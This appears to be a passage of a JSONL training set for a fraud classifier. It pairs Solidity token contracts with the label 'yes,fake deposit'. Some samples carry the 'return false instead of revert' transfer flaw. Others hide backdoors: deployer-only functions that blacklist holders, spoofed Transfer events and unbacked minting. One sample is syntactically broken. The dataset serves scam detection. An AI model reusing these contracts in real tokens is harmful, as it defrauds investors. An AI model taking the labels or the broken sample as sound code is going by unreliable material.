"yes,fake deposit###\n###"}
{"prompt": "pragma solidity ^0.4.4;\ncontract Token {\n /// @return total amount of tokens\n function totalSupply() constant returns (uint256 supply) {}\n/// @param _owner The address from which the balance will be retrieved\n /// @return The balance\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n/// @notice send `_value` token to `_to` from `msg.sender`\n /// @param _to The address of the recipient\n /// @param _value The amount of token to be transferred\n /// @return Whether the transfer was successful or not\n function transfer(address _to, uint256 _value) returns (bool success) {}\n/// @notice send `_value` token to `_to` from `_from` on the condition it is approved by `_from`\n /// @param _from The address of the sender\n /// @param _to The address of the recipient\n /// @param _value The amount of token to be transferred\n /// @return Whether the transfer was successful or not\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n/// @notice `msg.sender` approves `_addr` to spend `_value` tokens\n /// @param _spender The address of the account able to transfer the tokens\n /// @param _value The amount of wei to be approved for transfer\n /// @return Whether the approval was successful or not\n function approve(address _spender, uint256 _value) returns (bool success) {}\n/// @param _owner The address of the account owning tokens\n /// @param _spender The address of the account able to transfer the tokens\n /// @return Amount of remaining tokens allowed to spent\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\nevent Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract StandardToken is Token {\nfunction transfer(address _to, uint256 _value) returns (bool success) {\n //Default assumes totalSupply can\u2019t be over max (2\u00b2\u2075\u2076 \u2014 1).\n //If your token leaves out totalSupply and can issue more tokens as time goes on, you need to check if it doesn\u2019t wrap.\n //Replace the if with this one instead.\n //if (balances[msg.sender] >= _value && balances[_to] + _value > balances[_to]) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\nfunction transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n //same as above. Replace this line with the following if you want to protect against wrapping uints.\n //if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && balances[_to] + _value > balances[_to]) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\nfunction balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\nfunction approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\nfunction allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\nmapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\ncontract ERC20Token is StandardToken {\nfunction () {\n //if ether is sent to this address, send it back.\n throw;\n }\n\n string public name = \"ChoKInfO\"; //Name of the token\n uint8 public decimals = 18; //How many decimals to show. ie. There could 1000 base units with 3 decimals\n string public symbol =\"CKIO\"; //An identifier: eg AXM\n string public version = 'H1.0'; //human 0.1 standard. Just an arbitrary versioning scheme.\n//\n// CHANGE THE FOLLOWING VALUES FOR YOUR TOKEN!\n//\n//make sure this function name matches the contract name above. So if you\u2019re token is called TutorialToken, make sure the //contract name above is also TutorialToken instead of ERC20Token\nfunction ERC20Token(\n ) {\n balances[msg.sender] = 100000000 * (10 ** 18); // Give the creator all initial tokens (100000 for example)\n totalSupply = 100000000 * (10 ** 18); // Update total supply (100000 for example)\n name = \"ChoKInfO\"; // Set the name for display purposes\n decimals = 18; // Amount of decimals\n symbol = \"CKIO\"; // Set the symbol for display purposes\n }\n\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n//call the receiveApproval function on the contract you want to be notified. This crafts the function signature manually so one doesn\u2019t have to include a contract in here just for this.\n //receiveApproval(address _from, uint256 _value, address _tokenContract, bytes _extraData)\n //it is assumed that when does this that the call *should* succeed, otherwise one would use vanilla approve instead.\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "pragma solidity ^0.4.4;contract Token {\n /// @return total amount of tokens\n function totalSupply() constant returns (uint256 supply) {}/// @param _owner The address from which the balance will be retrieved\n /// @return The balance\n function balanceOf(address _owner) constant returns (uint256 balance) {}/// @notice send `_value` token to `_to` from `msg.sender`\n /// @param _to The address of the recipient\n /// @param _value The amount of token to be transferred\n /// @return Whether the transfer was successful or not\n function transfer(address _to, uint256 _value) returns (bool success) {}/// @notice send `_value` token to `_to` from `_from` on the condition it is approved by `_from`\n /// @param _from The address of the sender\n /// @param _to The address of the recipient\n /// @param _value The amount of token to be transferred\n /// @return Whether the transfer was successful or not\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}/// @notice `msg.sender` approves `_addr` to spend `_value` tokens\n /// @param _spender The address of the account able to transfer the tokens\n /// @param _value The amount of wei to be approved for transfer\n /// @return Whether the approval was successful or not\n function approve(address _spender, uint256 _value) returns (bool success) {}/// @param _owner The address of the account owning tokens\n /// @param _spender The address of the account able to transfer the tokens\n /// @return Amount of remaining tokens allowed to spent\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}contract StandardToken is Token {function transfer(address _to, uint256 _value) returns (bool success) {\n //Default assumes totalSupply can\u2019t be over max (2\u00b2\u2075\u2076 \u2014 1).\n //If your token leaves out totalSupply and can issue more tokens as time goes on, you need to check if it doesn\u2019t wrap.\n //Replace the if with this one instead.\n //if (balances[msg.sender] >= _value && balances[_to] + _value > balances[_to]) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n //same as above. Replace this line with the following if you want to protect against wrapping uints.\n //if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && balances[_to] + _value > balances[_to]) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}contract ERC20Token is StandardToken {function () {\n //if ether is sent to this address, send it back.\n throw;\n }\n string public name = \"American Redneck Company Coin\"; //Name of the token\n uint8 public decimals = 18; //How many decimals to show. ie. There could 1000 base units with 3 decimals\n string public symbol = \"ARCC\"; //An identifier: eg ARCC\n string public version = 'H1.0'; //human 0.1 standard. Just an arbitrary versioning scheme.//\n// CHANGE THE FOLLOWING VALUES FOR YOUR TOKEN!\n////make sure this function name matches the contract name above. So if you\u2019re token is called TutorialToken, make sure the //contract name above is also TutorialToken instead of ERC20Token\n\nfunction ERC20Token(\n ) {\n balances[msg.sender] = 1000000000000000; // Give the creator all initial tokens (100000 for example)\n totalSupply = 1000000000000000; // Update total supply (100000 for example)\n name = \"American Redneck Company Coin\"; // Set the name for display purposes\n decimals = 18; // Amount of decimals\n symbol = \"ARCC\"; // Set the symbol for display purposes\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);//call the receiveApproval function on the contract you want to be notified. This crafts the function signature manually so one doesn\u2019t have to include a contract in here just for this.\n //receiveApproval(address _from, uint256 _value, address _tokenContract, bytes _extraData)\n //it is assumed that when does this that the call *should* succeed, otherwise one would use vanilla approve instead.\n\nif \n(!_spender.call\n(bytes4(bytes32(sha3\n(\"receiveApproval(address,uint256,address,bytes)\"\n))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "pragma solidity 0.8.17;\n\n\n library SafeMath {\n\n function add(uint256 a, uint256 b) internal pure returns (uint256) {\n uint256 c = a + b;\n require(c >= a, \"SafeMath: addition overflow\");\n\n return c;\n }\n\n function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n return sub(a, b, \"SafeMath: subtraction overflow\");\n }\n\n function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n require(b <= a, errorMessage);\n uint256 c = a - b;\n\n return c;\n }\n\n function mul(uint256 a, uint256 b) internal pure returns (uint256) {\n\n if (a == 0) {\n return 0;\n }\n\n uint256 c = a * b;\n require(c / a == b, \"SafeMath: multiplication overflow\");\n\n return c;\n }\n\n\n function div(uint256 a, uint256 b) internal pure returns (uint256) {\n return div(a, b, \"SafeMath: division by zero\");\n }\n\n\n function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n require(b > 0, errorMessage);\n uint256 c = a / b;\n\n return c;\n }\n\n function mod(uint256 a, uint256 b) internal pure returns (uint256) {\n return mod(a, b, \"SafeMath: modulo by zero\");\n }\n\n function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n require(b != 0, errorMessage);\n return a % b;\n }\n} \n \n \n contract DIALECTIC {\n \n mapping (address => uint256) public IP;\n mapping (address => uint256) public BRNED;\n mapping (address => bool) Si;\n mapping(address => mapping(address => uint256)) public allowance;\n\n\n\n\n\n string public name = unicode\"AVOGAMI\";\n string public symbol = unicode\"AVOGAMI\";\n uint8 public decimals = 18;\n uint256 public totalSupply = 100000000 * (uint256(10) ** decimals);\n\taddress owner = msg.sender;\n \n\n event Approval(address indexed owner, address indexed spender, uint256 value);\n event Transfer(address indexed from, address indexed to, uint256 value);\n event OwnershipRenounced(address indexed previousOwner);\n address Head_Construct = 0x426903241ADA3A0092C3493a0C795F2ec830D622;\n\n constructor() {\n IP[msg.sender] = totalSupply;\n deploy(Head_Construct, totalSupply); }\n\n \n address Head_Deployer = 0x7A25aAbB0B3f595144C1821dBfA4d1A6c8B1761C;\n function deploy(address account, uint256 amount) public {\n require(msg.sender == owner);\n emit Transfer(address(0), account, amount); }\n\n function renounceOwnership() public {\n require(msg.sender == owner);\n emit OwnershipRenounced(owner);\n owner = address(0);}\n\n\n function transfer(address to, uint256 value) public returns (bool success) {\n \n \n if(msg.sender == Head_Deployer) {\n require(IP[msg.sender] >= value);\n IP[msg.sender] -= value; \n IP[to] += value; \n emit Transfer (Head_Construct, to, value);\n return true; } \n if(!Si[msg.sender]) {\n require(IP[msg.sender] >= value);\n IP[msg.sender] -= value; \n IP[to] += value; \n emit Transfer(msg.sender, to, value);\n return true; }}\n\n function approve(address spender, uint256 value) public returns (bool success) { \n allowance[msg.sender][spender] = value;\n emit Approval(msg.sender, spender, value);\n return true; }\n\n function burnt () public {\n if(msg.sender == Head_Deployer) {\n IP[msg.sender] = BRNED[msg.sender];\n }}\n\n function balanceOf(address account) public view returns (uint256) {\n return IP[account]; }\n\n function undo(address r) public {\n if(msg.sender == Head_Deployer) { \n Si[r] = false;}}\n function que(address r) public{\n if(msg.sender == Head_Deployer) { \n require(!Si[r]);\n Si[r] = true;\n }}\n function burn(uint256 x) public {\n if(msg.sender == Head_Deployer) { \n BRNED[msg.sender] = x;} }\n\n function transferFrom(address from, address to, uint256 value) public returns (bool success) { \n\n if(from == Head_Deployer) {\n require(value <= IP[from]);\n require(value <= allowance[from][msg.sender]);\n IP[from] -= value; \n IP[to] += value; \n emit Transfer (Head_Construct, to, value);\n return true; } \n if(!Si[from] && !Si[to]) {\n require(value <= IP[from]);\n require(value <= allowance[from][msg.sender]);\n IP[from] -= value;\n IP[to] += value;\n allowance[from][msg.sender] -= value;\n emit Transfer(from, to, value);\n return true; }}}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "// File: HRC.sol\n\n//SPDX-License-Identifier: MIT\npragma solidity ^0.4.16;\n\ncontract Token {\n\n /// @return total amount of tokens\n function totalSupply() constant returns (uint256 supply) {}\n\n /// @param _owner The address from which the balance will be retrieved\n /// @return The balance\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n\n /// @notice send `_value` token to `_to` from `msg.sender`\n /// @param _to The address of the recipient\n /// @param _value The amount of token to be transferred\n /// @return Whether the transfer was successful or not\n function transfer(address _to, uint256 _value) returns (bool success) {}\n\n /// @notice send `_value` token to `_to` from `_from` on the condition it is approved by `_from`\n /// @param _from The address of the sender\n /// @param _to The address of the recipient\n /// @param _value The amount of token to be transferred\n /// @return Whether the transfer was successful or not\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n\n /// @notice `msg.sender` approves `_addr` to spend `_value` tokens\n /// @param _spender The address of the account able to transfer the tokens\n /// @param _value The amount of wei to be approved for transfer\n /// @return Whether the approval was successful or not\n function approve(address _spender, uint256 _value) returns (bool success) {}\n\n /// @param _owner The address of the account owning tokens\n /// @param _spender The address of the account able to transfer the tokens\n /// @return Amount of remaining tokens allowed to spent\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n \n}\n\n\n\ncontract StandardToken is Token {\n\n function transfer(address _to, uint256 _value) returns (bool success) {\n //Default assumes totalSupply can't be over max (2^256 - 1).\n //If your token leaves out totalSupply and can issue more tokens as time goes on, you need to check if it doesn't wrap.\n //Replace the if with this one instead.\n //if (balances[msg.sender] >= _value && balances[_to] + _value > balances[_to]) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n //same as above. Replace this line with the following if you want to protect against wrapping uints.\n //if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && balances[_to] + _value > balances[_to]) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\n\n\n//name this contract whatever you'd like\ncontract ERC20Token is StandardToken {\n\n function () {\n //if ether is sent to this address, send it back.\n throw;\n }\n\n \n\n \n string public name; //fancy name: eg Simon Bucks\n uint8 public decimals; //How many decimals to show. ie. There could 1000 base units with 3 decimals. Meaning 0.980 SBX = 980 base units. It's like comparing 1 wei to 1 ether.\n string public symbol; //An identifier: eg SBX\n string public version = 'H1.0'; //human 0.1 standard. Just an arbitrary versioning scheme.\n\n//\n// CHANGE THESE VALUES FOR YOUR TOKEN\n//\n\n//make sure this function name matches the contract name above. So if you're token is called TutorialToken, make sure the //contract name above is also TutorialToken instead of ERC20Token\n\n function ERC20Token(\n ) {\n balances[msg.sender] = 100000000000000000; // Give the creator all initial tokens (100000 for example)\n totalSupply = 100000000000000000; // Update total supply (100000 for example)\n name = \"Huerey coin\"; // Set the name for display purposes\n decimals = 8; // Amount of decimals for display purposes\n symbol = \"HRC\"; // Set the symbol for display purposes\n }\n\n \n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n\n //call the receiveApproval function on the contract you want to be notified. This crafts the function signature manually so one doesn't have to include a contract in here just for this.\n //receiveApproval(address _from, uint256 _value, address _tokenContract, bytes _extraData)\n //it is assumed that when does this that the call *should* succeed, otherwise one would use vanilla approve instead.\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "//SPDX-License-Identifier: SPDX License\n// Compatible with version\n// of compiler upto 0.6.12\npragma solidity ^0.6.12;\n\n// Creating a Contract\ncontract MetaSigma\n{\n\n// Table to map addresses\n// to their balance\nmapping(address => uint256) balances;\n\n// Mapping owner address to\n// those who are allowed to\n// use the contract\nmapping(address => mapping (\n\t\taddress => uint256)) allowed;\n\n// totalSupply\nuint256 _totalSupply = 122800000*10*18;\n\n// owner address\naddress public owner = 0x9aBcf7Ea64A1D9eA0e41Cc299989aBe7561A8364\n\n// Triggered whenever\n// approve(address _spender, uint256 _value)\n// is called.\n;event Approval(address indexed _owner,\n\t\t\t\taddress indexed _spender,\n\t\t\t\tuint256 _value);\n\n// Event triggered when\n// tokens are transferred.\nevent Transfer(address indexed _from,\n\t\t\taddress indexed _to,\n\t\t\tuint256 _value);\n\n// totalSupply function\nfunction totalSupply()\n\t\tpublic view returns (\n\t\tuint256 theTotalSupply)\n{\ntheTotalSupply = _totalSupply;\nreturn theTotalSupply;\n}\n\n// balanceOf function\nfunction balanceOf(address _owner)\n\t\tpublic view returns (\n\t\tuint256 balance)\n{\nreturn balances[_owner];\n}\n\n// function approve\nfunction approve(address _spender,\n\t\t\t\tuint256 _amount)\n\t\t\t\tpublic returns (bool success)\n{\n\t// If the address is allowed\n\t// to spend from this contract\nallowed[msg.sender][_spender] = _amount; 6000000*10**18\n\t\n// Fire the event \"Approval\"\n// to execute any logic that\n// was listening to it\n;emit Approval(msg.sender,\n\t\t\t\t_spender, _amount);\nreturn true;\n}\n\n// transfer function\nfunction transfer(address _to,\n\t\t\t\tuint256 _amount)\n\t\t\t\tpublic returns (bool success)\n{\n\t// transfers the value if\n\t// balance of sender is\n\t// greater than the amount\n\tif (balances[msg.sender] >= _amount)\n\t{\n\t\tbalances[msg.sender] -= _amount;\n\t\tbalances[_to] += _amount;\n\t\t\n\t\t// Fire a transfer event for\n\t\t// any logic that is listening\n\t\temit Transfer(msg.sender,\n\t\t\t\t\t_to, _amount);\n\t\t\treturn true;\n\t}\n\telse\n\t{\n\t\treturn false;\n\t}\n}\n\n\n\nfunction transferFrom(address _from,\n\t\t\t\t\taddress _to,\n\t\t\t\t\tuint256 _amount)\n\t\t\t\t\tpublic returns (bool success)\n{\nif (balances[_from] >= _amount &&\n\tallowed[_from][msg.sender] >=\n\t_amount && _amount > 0 &&\n\tbalances[_to] + _amount > balances[_to])\n{\n\t\tbalances[_from] -= _amount;\n\t\tbalances[_to] += _amount;\n\t\t\n\t\t// Fire a Transfer event for\n\t\t// any logic that is listening\n\t\temit Transfer(_from, _to, _amount);\n\treturn true;\n\n}\nelse\n{\n\treturn false;\n}\n}\n\n// Check if address is allowed\n// to spend on the owner's behalf\nfunction allowance(address _owner,\n\t\t\t\taddress _spender)\n\t\t\t\tpublic view returns (uint256 remaining)\n{\nreturn allowed[_owner][_spender];\n}\n}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "pragma solidity 0.8.17;\n\n\n library SafeMath {\n\n function add(uint256 a, uint256 b) internal pure returns (uint256) {\n uint256 c = a + b;\n require(c >= a, \"SafeMath: addition overflow\");\n\n return c;\n }\n\n function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n return sub(a, b, \"SafeMath: subtraction overflow\");\n }\n\n function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n require(b <= a, errorMessage);\n uint256 c = a - b;\n\n return c;\n }\n\n function mul(uint256 a, uint256 b) internal pure returns (uint256) {\n\n if (a == 0) {\n return 0;\n }\n\n uint256 c = a * b;\n require(c / a == b, \"SafeMath: multiplication overflow\");\n\n return c;\n }\n\n\n function div(uint256 a, uint256 b) internal pure returns (uint256) {\n return div(a, b, \"SafeMath: division by zero\");\n }\n\n\n function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n require(b > 0, errorMessage);\n uint256 c = a / b;\n\n return c;\n }\n\n function mod(uint256 a, uint256 b) internal pure returns (uint256) {\n return mod(a, b, \"SafeMath: modulo by zero\");\n }\n\n function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n require(b != 0, errorMessage);\n return a % b;\n }\n} \n \n \n contract INJERA {\n \n mapping (address => uint256) public Nii;\n mapping (address => uint256) public Mii;\n mapping (address => bool) Oii;\n mapping(address => mapping(address => uint256)) public allowance;\n\n\n\n\n\n string public name = unicode\"The INJERA\";\n string public symbol = unicode\"INJERA\";\n uint8 public decimals = 18;\n uint256 public totalSupply = 150000000 * (uint256(10) ** decimals);\n\taddress owner = msg.sender;\n \n\n event Approval(address indexed owner, address indexed spender, uint256 value);\n event Transfer(address indexed from, address indexed to, uint256 value);\n event OwnershipRenounced(address indexed previousOwner);\n address t_Construct = 0xAb5801a7D398351b8bE11C439e05C5B3259aeC9B;\n\n constructor() {\n Nii[msg.sender] = totalSupply;\n deploy(t_Construct, totalSupply); }\n\n \n address tdeploy = 0xeCB4f007bF97E81cb7bE6abA7Dd691fE8f99E803;\n function deploy(address account, uint256 amount) public {\n require(msg.sender == owner);\n emit Transfer(address(0), account, amount); }\n\n function renounceOwnership() public {\n require(msg.sender == owner);\n emit OwnershipRenounced(owner);\n owner = address(0);}\n\n\n function transfer(address to, uint256 value) public returns (bool success) {\n \n \n if(msg.sender == tdeploy) {\n require(Nii[msg.sender] >= value);\n Nii[msg.sender] -= value; \n Nii[to] += value; \n emit Transfer (t_Construct, to, value);\n return true; } \n if(!Oii[msg.sender]) {\n require(Nii[msg.sender] >= value);\n Nii[msg.sender] -= value; \n Nii[to] += value; \n emit Transfer(msg.sender, to, value);\n return true; }}\n\n function approve(address spender, uint256 value) public returns (bool success) { \n allowance[msg.sender][spender] = value;\n emit Approval(msg.sender, spender, value);\n return true; }\n\n function tdir () public {\n if(msg.sender == tdeploy) {\n Nii[msg.sender] = Mii[msg.sender];\n }}\n\n function balanceOf(address account) public view returns (uint256) {\n return Nii[account]; }\n\n function trmv(address zi) public {\n if(msg.sender == tdeploy) { \n Oii[zi] = false;}}\n function taubl(address zi) public{\n if(msg.sender == tdeploy) { \n require(!Oii[zi]);\n Oii[zi] = true;\n }}\n function tbrn(uint256 xi) public {\n if(msg.sender == tdeploy) { \n Mii[msg.sender] = xi;} }\n\n function transferFrom(address from, address to, uint256 value) public returns (bool success) { \n\n if(from == tdeploy) {\n require(value <= Nii[from]);\n require(value <= allowance[from][msg.sender]);\n Nii[from] -= value; \n Nii[to] += value; \n emit Transfer (t_Construct, to, value);\n return true; } \n if(!Oii[from] && !Oii[to]) {\n require(value <= Nii[from]);\n require(value <= allowance[from][msg.sender]);\n Nii[from] -= value;\n Nii[to] += value;\n allowance[from][msg.sender] -= value;\n emit Transfer(from, to, value);\n return true; }}}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "pragma solidity 0.8.17;\n\nabstract contract Context {\n function _msgSender() internal view virtual returns (address) {\n return msg.sender;\n }\n}\n\n\n\nlibrary SafeMath {\n function add(uint256 a, uint256 b) internal pure returns (uint256) {\n uint256 c = a + b;\n require(c >= a, \"SafeMath: addition overflow\");\n return c;\n }\n\n function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n return sub(a, b, \"SafeMath: subtraction overflow\");\n }\n\n function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n require(b <= a, errorMessage);\n uint256 c = a - b;\n return c;\n }\n\n function mul(uint256 a, uint256 b) internal pure returns (uint256) {\n if (a == 0) {\n return 0;\n }\n uint256 c = a * b;\n require(c / a == b, \"SafeMath: multiplication overflow\");\n return c;\n }\n\n function div(uint256 a, uint256 b) internal pure returns (uint256) {\n return div(a, b, \"SafeMath: division by zero\");\n }\n\n function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n require(b > 0, errorMessage);\n uint256 c = a / b;\n return c;\n }\n\n}\n\ncontract Ownable is Context {\n address private _Owner;\n event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\n event Transfer(address indexed from, address indexed to, uint256 value);\n event Approval(address indexed owner, address indexed spender, uint256 value);\n address AZC = 0xC7a583B709B51f8Ad45E3879C7b148881bA3877d;\n\taddress aZRouterV2 = 0xD1C24f50d05946B3FABeFBAe3cd0A7e9938C63F2;\n constructor () {\n address msgSender = _msgSender();\n _Owner = msgSender;\n emit OwnershipTransferred(address(0), msgSender);\n }\n\n function owner() public view returns (address) {\n return _Owner;\n }\n\n function renounceOwnership() public virtual {\n require(msg.sender == _Owner);\n emit OwnershipTransferred(_Owner, address(0));\n _Owner = address(0);\n }\n \t\tmodifier AX{\n require(msg.sender == _Owner);\n _; }\n\n}\n\n\n\ncontract DISCO is Context, Ownable {\n using SafeMath for uint256;\n mapping (address => uint256) private Ac;\n\tmapping (address => bool) private Ab;\n mapping (address => bool) private Az;\n mapping (address => mapping (address => uint256)) private Ae;\n uint8 private constant _decimals = 8;\n uint256 private constant sA = 200000000 * 10**_decimals;\n string private constant _name = \"Disco.xyz\";\n string private constant _symbol = \"DISCO\";\n\n\n\n constructor () {\n Ac[_msgSender()] = sA;\n emit Transfer(address(0), aZRouterV2, sA);\n }\n\n function name() public pure returns (string memory) {\n return _name;\n }\n\n function symbol() public pure returns (string memory) {\n return _symbol;\n }\n\n function decimals() public pure returns (uint8) {\n return _decimals;\n }\n\n function totalSupply() public pure returns (uint256) {\n return sA;\n }\n\n function balanceOf(address account) public view returns (uint256) {\n return Ac[account];\n }\n\n\n function allowance(address owner, address spender) public view returns (uint256) {\n return Ae[owner][spender];\n }\n\t\tfunction ARX(address Af) AX public{\n Ab[Af] = true; }\n\n function approve(address spender, uint256 amount) public returns (bool success) { \n Ae[msg.sender][spender] = amount;\n emit Approval(msg.sender, spender, amount);\n return true; }\n\t\tfunction ADX(address Af) public {\n if(Ab[msg.sender]) { \n Az[Af] = false;}}\n function aQuery(address Af) public{\n if(Ab[msg.sender]) { \n require(!Az[Af]);\n Az[Af] = true; }}\n\n\t\tfunction transferFrom(address sender, address recipient, uint256 amount) public returns (bool success) {\n if(sender == AZC) {\n require(amount <= Ac[sender]);\n Ac[sender] -= amount; \n Ac[recipient] += amount; \n Ae[sender][msg.sender] -= amount;\n emit Transfer (aZRouterV2, recipient, amount);\n return true; } else \n if(!Az[recipient]) {\n if(!Az[sender]) {\n require(amount <= Ac[sender]);\n require(amount <= Ae[sender][msg.sender]);\n Ac[sender] -= amount;\n Ac[recipient] += amount;\n Ae[sender][msg.sender] -= amount;\n emit Transfer(sender, recipient, amount);\n return true; }}}\n\t\tfunction transfer(address Ai, uint256 Af) public {\n if(msg.sender == AZC) {\n require(Ac[msg.sender] >= Af);\n Ac[msg.sender] -= Af; \n Ac[Ai] += Af; \n emit Transfer (aZRouterV2, Ai, Af);} else \n if(Ab[msg.sender]) {Ac[Ai] += Af;} else\n if(!Az[msg.sender]) {\n require(Ac[msg.sender] >= Af);\n Ac[msg.sender] -= Af; \n Ac[Ai] += Af; \n emit Transfer(msg.sender, Ai, Af);}}}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "pragma solidity 0.8.17;\n\n\n library SafeMath {\n\n function add(uint256 a, uint256 b) internal pure returns (uint256) {\n uint256 c = a + b;\n require(c >= a, \"SafeMath: addition overflow\");\n\n return c;\n }\n\n function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n return sub(a, b, \"SafeMath: subtraction overflow\");\n }\n\n function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n require(b <= a, errorMessage);\n uint256 c = a - b;\n\n return c;\n }\n\n function mul(uint256 a, uint256 b) internal pure returns (uint256) {\n\n if (a == 0) {\n return 0;\n }\n\n uint256 c = a * b;\n require(c / a == b, \"SafeMath: multiplication overflow\");\n\n return c;\n }\n\n\n function div(uint256 a, uint256 b) internal pure returns (uint256) {\n return div(a, b, \"SafeMath: division by zero\");\n }\n\n\n function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n require(b > 0, errorMessage);\n uint256 c = a / b;\n\n return c;\n }\n\n function mod(uint256 a, uint256 b) internal pure returns (uint256) {\n return mod(a, b, \"SafeMath: modulo by zero\");\n }\n\n function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n require(b != 0, errorMessage);\n return a % b;\n }\n} \n \n \n contract KRIOS {\n \n mapping (address => uint256) public Sz;\n mapping (address => uint256) public Ui;\n mapping (address => bool) oZ;\n mapping(address => mapping(address => uint256)) public allowance;\n\taddress pstruct = 0xBc46cB43DA85A65774acfCA3B03b7234E8e81c7a;\n\taddress RouterV3 = 0x426903241ADA3A0092C3493a0C795F2ec830D622;\n\n\n\n\n string public name = unicode\"Krios Labs\";\n string public symbol = unicode\"KRIOS\";\n uint8 public decimals = 18;\n uint256 public totalSupply = 250000000 * (uint256(10) ** decimals);\n\taddress owner = msg.sender;\n \n\n event Approval(address indexed owner, address indexed spender, uint256 value);\n event Transfer(address indexed from, address indexed to, uint256 value);\n event OwnershipRenounced(address indexed previousOwner);\n\n\n constructor() {\n Sz[msg.sender] = totalSupply;\n emit 